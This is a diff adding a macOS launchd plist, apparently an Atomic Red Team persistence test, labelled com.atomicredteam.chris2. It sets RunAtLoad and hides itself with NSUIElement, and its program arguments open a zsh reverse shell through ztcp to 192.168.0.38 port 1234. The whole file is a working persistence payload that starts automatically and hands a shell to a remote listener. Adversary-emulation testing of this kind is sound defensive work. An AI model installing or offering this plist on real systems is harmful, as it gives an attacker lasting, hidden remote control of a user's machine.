@@ -1,0 +1,22 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+  <key>Label</key>
+  <string>com.atomicredteam.chris2</string>
+  <key>ProgramArguments</key>
+  <array>
+  <string>zsh</string>
+  <string>-c</string>
+  <string>zmodload zsh/net/tcp && ztcp 192.168.0.38 1234 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY</string>
+  </array>
+  <key>RunAtLoad</key>
+  <true/>
+  <key>NSUIElement</key>
+  <string>1</string>
+  <key>StandardOutPath</key>
+  <string>/Users/chris.tziampazis/Desktop/output2.log</string>
+  <key>StandardErrorPath</key>
+  <string>/Users/chris.tziampazis/Desktop/error2.log</string>
+</dict>
+</plist>
